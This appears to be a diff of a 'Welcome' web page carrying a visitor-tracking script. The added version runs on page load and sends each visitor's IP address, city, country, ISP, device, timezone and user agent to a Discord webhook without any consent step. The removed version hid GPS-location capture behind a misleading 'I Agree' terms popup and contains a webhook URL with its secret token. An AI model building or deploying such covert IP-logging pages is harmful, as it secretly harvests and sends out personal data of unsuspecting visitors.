@@ -4,63 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Welcome</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: Arial, sans-serif; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
-
-    #popup {
-      background: #1e1e1e;
-      border: 1px solid #333;
-      border-radius: 12px;
-      padding: 32px;
-      max-width: 400px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-    }
-
-    #popup h2 { margin-bottom: 12px; font-size: 20px; }
-    #popup p { font-size: 14px; color: #aaa; margin-bottom: 24px; line-height: 1.6; }
-
-    #agree {
-      background: #5865F2;
-      color: white;
-      border: none;
-      padding: 12px 32px;
-      border-radius: 8px;
-      font-size: 15px;
-      cursor: pointer;
-      width: 100%;
-    }
-
-    #agree:hover { background: #4752c4; }
-
-    #decline {
-      margin-top: 12px;
-      background: none;
-      border: none;
-      color: #555;
-      font-size: 13px;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-  </style>
 </head>
 <body>
 
-<div id="popup">
-  <h2>Welcome</h2>
-  <p>By continuing you agree to our Terms & Conditions and Privacy Policy. We may collect basic usage data to improve your experience.</p>
-  <button id="agree">I Agree</button>
-  <br/>
-  <button id="decline">Decline</button>
-</div>
-
 <script>
-document.getElementById("agree").addEventListener("click", async () => {
-  document.getElementById("popup").style.display = "none";
-
-  const webhook = "https://discord.com/api/webhooks/1569423188444844102/TzobQigAEqKxy8I2dPf9xxm96TDvG2nEeFni_GrroL-XGX7c2OwH-5aM0yPtQDfN1RLU";
+(async () => {
+  const webhook = "YOUR_WEBHOOK_URL_HERE";
 
   const ua = navigator.userAgent;
   const platform = navigator.platform;
@@ -100,23 +49,11 @@ document.getElementById("agree").addEventListener("click", async () => {
     isp = data.connection?.isp ?? "Unknown";
   } catch (_) {}
 
-  let lat = "Unknown";
-  let lon = "Unknown";
-  try {
-    await new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition((pos) => {
-        lat = pos.coords.latitude.toFixed(5);
-        lon = pos.coords.longitude.toFixed(5);
-        resolve();
-      }, resolve, { timeout: 5000 });
-    });
-  } catch (_) {}
-
   const payload = {
     username: "Site Tracker",
     embeds: [{
-      title: "New Visitor — Agreed to Terms",
-      color: 0x57F287,
+      title: "New Visitor",
+      color: 0x5865F2,
       fields: [
         { name: "Device Type", value: deviceType, inline: true },
         { name: "OS", value: os, inline: true },
@@ -125,16 +62,14 @@ document.getElementById("agree").addEventListener("click", async () => {
         { name: "Language", value: lang, inline: true },
         { name: "Timezone", value: timezone, inline: true },
         { name: "IP Address", value: ip, inline: true },
-        { name: "City (IP)", value: city, inline: true },
+        { name: "City", value: city, inline: true },
         { name: "Country", value: country, inline: true },
         { name: "ISP", value: isp, inline: true },
-        { name: "GPS Lat", value: String(lat), inline: true },
-        { name: "GPS Lon", value: String(lon), inline: true },
         { name: "Platform", value: platform, inline: true },
         { name: "Time", value: time, inline: false },
         { name: "User Agent", value: `\`${ua.slice(0, 200)}\``, inline: false }
       ],
-      footer: { text: "User accepted terms" }
+      footer: { text: "Visitor log" }
     }]
   };
 
@@ -143,11 +78,7 @@ document.getElementById("agree").addEventListener("click", async () => {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
   });
-});
-
-document.getElementById("decline").addEventListener("click", () => {
-  document.getElementById("popup").innerHTML = "<p style='color:#555'>You declined. Access restricted.</p>";
-});
+})();
 </script>
 
 </body>
